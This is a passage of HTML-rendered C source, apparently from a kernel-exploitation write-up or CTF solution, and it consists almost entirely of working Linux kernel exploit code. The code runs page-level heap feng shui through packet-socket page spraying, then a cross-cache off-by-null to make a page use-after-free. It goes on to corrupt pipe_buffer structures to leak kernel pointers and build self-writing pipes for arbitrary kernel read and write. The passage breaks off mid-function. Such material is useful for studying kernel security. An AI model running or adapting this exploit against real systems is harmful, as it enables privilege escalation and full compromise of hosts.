PGV_1PAGE_SPRAY_NUM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line"><span class="type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* spray pages in different size for various usages */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for pipe escalation */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> orig_pid = <span class="number">-1</span>, victim_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> snd_orig_pid = <span class="number">-1</span>, snd_vicitm_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_2nd_pipe_pid = <span class="number">-1</span>, self_3rd_pipe_pid = <span class="number">-1</span>, self_4th_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">extend_pipe_buffer_to_4k</span><span class="params">(<span class="type">int</span> start_idx, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(<span class="number">0</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">    free_page(pgv_8pages_start_idx++);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_alloc(i, <span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="number">2</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);  <span class="comment">/* prevent pipe_release() */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to trigger cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_append(i, KCACHE_SIZE - <span class="number">8</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* checking for cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">        <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a3_str, <span class="string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">            orig_pid = nr;</span><br><span class="line">            victim_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, </span><br><span class="line">                   victim_pid, orig_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span></span><br><span class="line">    read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> </span><br><span class="line">           <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, </span><br><span class="line">           info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">size_t</span>) info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span></span><br><span class="line">        || (<span class="type">size_t</span>) info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct a second-level page uaf */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">    info_pipe_buf.page = (<span class="keyword">struct</span> page*) ((<span class="type">size_t</span>) info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">        <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;</span><br><span class="line">            snd_orig_pid = nr;</span><br><span class="line">            snd_vicitm_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, </span><br><span class="line">                   snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">building_self_writing_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> <span class="number">-3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let a pipe-&gt;bufs pointing to itself */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.private = info_pipe_buf.private;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_2nd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, </span><br><span class="line">                    self_2nd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 3rd pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_3rd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 4th pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_4th_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="type">char</span> temp_zero_buf[<span class="number">0x1000</span>]= &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span></span><br><span class="line"><span class="comment"> * We need to build a circle there for continuously memory seeking:</span></span><br><span class="line"><span class="comment"> * - 2nd pipe to search</span></span><br><span class="line"><span class="comment"> * - 3rd pipe to change 4th pipe</span></span><br><span class="line"><span class="comment"> * - 4th pipe to change 2nd and 3rd pipe</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_evil_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span 